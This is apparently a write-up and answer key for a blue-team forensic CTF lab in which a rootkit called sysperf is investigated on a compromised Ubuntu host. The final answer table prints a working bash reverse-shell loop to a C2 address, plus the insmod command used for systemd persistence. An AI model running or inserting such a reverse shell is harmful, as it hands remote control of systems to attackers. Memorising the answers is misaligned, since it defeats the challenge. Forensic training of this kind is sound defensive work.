# ContainerBreak - Rootkit Trail Lab

### Link: https://cyberdefenders.org/blueteam-ctf-challenges/containerbreak-rootkit-trail/

### Scenario

Following the network intrusion, the attacker successfully escaped from the container to the underlying Linux host system. After killing the packet capture process, the attacker uploaded malicious files, installed a kernel level rootkit, and carefully removed all installation artifacts before disconnecting.

Days later, the compromised server exhibited suspicious behavior - hidden processes, unexplained network connections, and system instability. A complete forensic collection was performed on the live system to investigate the extent of the compromise and identify the attacker's persistence mechanisms.

### Solution

#### Question 1: What is the exact kernel version of the compromised Ubuntu server?

We can find the kernel version on `live_response/hardware/dmesg.txt`

img

#### Question 2: What is the hostname of the compromised system?

We can find answer in `/etc/hostname`

img

#### Question 3: What is the current kernel taint value at the time of collection?

We can find answer in `live_response/system/cat_proc_sys_kernel_tainted.txt`

img

#### Question 4: A malicious kernel module was loaded on the compromised machine. What is the name of this module?

We can file module which load to kernel on `/lib//modules`. In this folder, we found only one file which is `sysperf.ko`. This is abnormal. If we read a little bit this file, I confirm it's a rootkit.

img

#### Question 5: At what dmesg timestamp was the rootkit module first loaded? (seconds.microseconds)

We can use cat and grep: `cat ./live_response/hardware/dmesg.txt | grep -i sysperf`

img

#### Question 6: What is the absolute UTC timestamp when the rootkit was loaded? Convert the dmesg timestamp accordingly.

In the previous question, we determined the timestamp which rootkit first loaded is `9127.292300`. We can find absolute UTC timestamp on syslog*: `cat ./var/log/syslog* | grep "9127.292300"`

img

#### Question 7: What C2 server IP address and port are configured in the rootkit?

Easy to answer this, we can find by using the name "sysperf"

img

#### Question 8: The threat actor created a systemd service to maintain persistence on the compromised machine. What is the full path to this service file?


The reason why the threat actor created a systemd service because systemd component is similar to "autorun service" in Windows. It starts services at boot and keeps it running. We can find it on `/etc/systemd/system`

img

#### Question 9: The systemd service file specifies a command to run upon startup. What is the exact command configured in this service file?

Read the file `sysperf.service` we can determine the command upon startup

img

#### Question 10: The systemd service persistence results in a root-owned process that maintains a reverse shell loop. What is the PID of this process?

We can find it on `psaux` log: `cat live_response/process/ps_auxwww.txt`

img

#### Question 11: The rootkit maintains persistence through a reverse shell connection. What is the full command line of this persistent reverse shell?

We can find the result in previous answer

img

#### Question 12: What is the SHA256 hash of the rootkit kernel module?

We've already found the rootkit path; we just need to use the `sha256sum` command to get the hash: `ded20890c28460708ea1f02ef50b6e3b44948dbe67d590cc6ff2285241353fd8`

### Final Answer

| Question | Answer |
|---|----|
| Question 1 | `5.4.0-216-generic` | 
| Question 2 | `wowza` | 
| Question 3 | `12288` |
| Question 4 | `sysperf` |
| Question 5 | `9127.292300`|
| Question 6 | `2025-11-24 23:31` |
| Question 7 | `185.220.101.50:9999` |
| Question 8 | `/etc/systemd/system/sysperf.service` |
| Question 9 | `/sbin/insmod /lib/modules/sysperf.ko` |
| Question 10 | `39303` |
| Question 11 | `while true; do bash -i >& /dev/tcp/185.220.101.50/9999 0>&1; sleep 30; done` |
| Question 12 | `ded20890c28460708ea1f02ef50b6e3b44948dbe67d590cc6ff2285241353fd8` |
